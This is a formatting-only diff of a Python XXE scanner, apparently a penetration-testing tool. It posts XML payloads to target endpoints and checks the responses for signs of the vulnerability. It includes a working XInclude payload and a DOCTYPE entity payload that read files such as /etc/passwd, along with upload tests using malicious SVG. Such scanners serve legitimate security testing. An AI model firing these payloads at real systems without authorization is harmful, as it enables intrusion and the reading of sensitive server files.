@@ -124,9 +124,7 @@ ENCODING_PAYLOADS = [
 ]
 
 # ──────────── XINCLUDE ────────────
-XINCLUDE_PAYLOAD = (
-    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
-)
+XINCLUDE_PAYLOAD = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
 
 
 def _get_baseline_latency(target):
@@ -146,7 +144,10 @@ def _get_404_baseline(target, endpoint):
         # Envia um XML vazio/inválido curto para ver o erro genérico do parser,
         # ou se o WAF bloqueia com uma página genérica.
         resp = requests.post(
-            url, data="<cascavel>invalid_baseline</cascavel>", timeout=6, headers={"Content-Type": "application/xml"}
+            url,
+            data="<cascavel>invalid_baseline</cascavel>",
+            timeout=6,
+            headers={"Content-Type": "application/xml"},
         )
         return len(resp.text)
     except Exception:
@@ -159,7 +160,9 @@ def _verify_waf_blind_reflection(target, endpoint, payload_xml):
     url = f"http://{target}{endpoint}"
     test_xml = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/cascavel_invalid">]><data>{test_val}</data>'
     try:
-        resp = requests.post(url, data=test_xml, timeout=5, headers={"Content-Type": "application/xml"})
+        resp = requests.post(
+            url, data=test_xml, timeout=5, headers={"Content-Type": "application/xml"}
+        )
         if test_val in resp.text:
             return True
         return False
@@ -177,15 +180,22 @@ def _test_classic_xxe(target, endpoint):
     for payload in CLASSIC_PAYLOADS:
         for ct in CONTENT_TYPES[:3]:
             try:
-                resp = requests.post(url, data=payload["xml"], timeout=8, headers={"Content-Type": ct})
+                resp = requests.post(
+                    url, data=payload["xml"], timeout=8, headers={"Content-Type": ct}
+                )
 
                 # Check FP via soft-404 / generic block size
-                if baseline_len > 0 and abs(len(resp.text) - baseline_len) / baseline_len < 0.05:
+                if (
+                    baseline_len > 0
+                    and abs(len(resp.text) - baseline_len) / baseline_len < 0.05
+                ):
                     continue
 
                 if resp.status_code == 200:
                     if payload["indicador"] and payload["indicador"] in resp.text:
-                        if not _verify_waf_blind_reflection(target, endpoint, payload["xml"]):
+                        if not _verify_waf_blind_reflection(
+                            target, endpoint, payload["xml"]
+                        ):
                             vulns.append(
                                 {
                                     "tipo": "XXE",
@@ -199,7 +209,9 @@ def _test_classic_xxe(target, endpoint):
                             )
                             break
                     elif any(kw in resp.text.lower() for kw in XML_PARSER_ERRORS):
-                        if not _verify_waf_blind_reflection(target, endpoint, payload["xml"]):
+                        if not _verify_waf_blind_reflection(
+                            target, endpoint, payload["xml"]
+                        ):
                             vulns.append(
                                 {
                                     "tipo": "XXE_PARSER_DETECTED",
@@ -223,11 +235,15 @@ def _test_blind_xxe(target, endpoint, baseline_latency):
         for ct in CONTENT_TYPES[:2]:
             try:
                 start = time.time()
-                resp = requests.post(url, data=payload["xml"], timeout=8, headers={"Content-Type": ct})
+                resp = requests.post(
+                    url, data=payload["xml"], timeout=8, headers={"Content-Type": ct}
+                )
                 elapsed = time.time() - start
                 # Se demorou excessivamente mais que o baseline, não assumir injeção direto se for WAF delay
                 # Blind XXE não retorna dados — marcar como injetado se a resposta foi limpa
-                if resp.status_code in (200, 500, 400) and elapsed < (baseline_latency + 4.0):
+                if resp.status_code in (200, 500, 400) and elapsed < (
+                    baseline_latency + 4.0
+                ):
                     vulns.append(
                         {
                             "tipo": "XXE_BLIND_INJECTED",
@@ -249,7 +265,13 @@ def _test_blind_xxe(target, endpoint, baseline_latency):
 def _test_svg_upload(target):
     """Testa XXE via upload de SVG malicioso."""
     vulns = []
-    upload_endpoints = ["/upload", "/api/upload", "/api/v1/upload", "/api/avatar", "/api/image"]
+    upload_endpoints = [
+        "/upload",
+        "/api/upload",
+        "/api/v1/upload",
+        "/api/avatar",
+        "/api/image",
+    ]
 
     for ep in upload_endpoints:
         url = f"http://{target}{ep}"
@@ -314,7 +336,12 @@ def _test_xinclude(target, endpoint):
     """Testa XInclude injection (quando não se controla DOCTYPE)."""
     url = f"http://{target}{endpoint}"
     try:
-        resp = requests.post(url, data=XINCLUDE_PAYLOAD, timeout=6, headers={"Content-Type": "application/xml"})
+        resp = requests.post(
+            url,
+            data=XINCLUDE_PAYLOAD,
+            timeout=6,
+            headers={"Content-Type": "application/xml"},
+        )
         if "root:" in resp.text:
             return {
                 "tipo": "XINCLUDE_INJECTION",
@@ -335,8 +362,16 @@ def _test_encoding_bypass(target, endpoint):
 
     for payload in ENCODING_PAYLOADS:
         try:
-            resp = requests.post(url, data=payload["xml"], timeout=8, headers={"Content-Type": "application/xml"})
-            if baseline_len > 0 and abs(len(resp.text) - baseline_len) / baseline_len < 0.05:
+            resp = requests.post(
+                url,
+                data=payload["xml"],
+                timeout=8,
+                headers={"Content-Type": "application/xml"},
+            )
+            if (
+                baseline_len > 0
+                and abs(len(resp.text) - baseline_len) / baseline_len < 0.05
+            ):
                 continue
 
             if payload["indicador"] and payload["indicador"] in resp.text:
